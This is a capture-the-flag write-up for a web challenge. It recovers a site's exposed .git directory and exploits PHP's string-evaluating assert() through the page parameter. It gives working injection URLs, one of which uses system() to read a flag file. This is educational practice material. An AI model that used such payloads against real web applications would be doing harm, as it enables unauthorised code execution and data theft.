The webmaster used Git.
A reasonable guess will lead one to discover that the http://web.chal.csaw.io:8000/.git/ directory exists.
Use `wget -r` (or some similar tool) to download the git directory and look through the files.
Looking through the source can give us a hint of how to break this site.

Git commit message is "I love PHP's typesafety!"
Funny you should mention that...

We see a suspicious assert:

```php
if (isset($_GET['page'])) {
       $page = $_GET['page'];
} else {
       $page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");
```

Hey, that's a string being passed to assert.
What's that do now?

http://php.net/manual/en/function.assert.php

"If the assertion is given as a string it will be evaluated as PHP code by assert()".
Thanks PHP.

You know what happens when you let user input get `eval`ed.

    http://web.chal.csaw.io:8000/?page=','') or die("HI") or f('

Step by step now, this makes `$file` take on the value:

```php
$file = "templates/','') or die("HI") or f('.php"
```

And that makes the first  `assert` line do the following:

```php
assert("strpos('templates/','') or die("HI") or f('.php', '..') === false") or die("Detected hacking attempt!");
//                        ^^^^^^^^^^^^^^^^^^^^^^^^^ our "page"
```

Great, now the page says back "HI" to us.
Never mind the fact that the `f` function doesn't exist; execution never reaches that point.

This means we can substitute any string for "HI" and it will get evaluated then shown to us.

We can use `fopen` and `fread`, but I feel more comfortable with `system`, so we'll just use that.

The winning URL (view source on the target page to see it):

    http://web.chal.csaw.io:8000/?page=','') or die(system("cat templates/flag.php")) or f('

Thank you for playing.
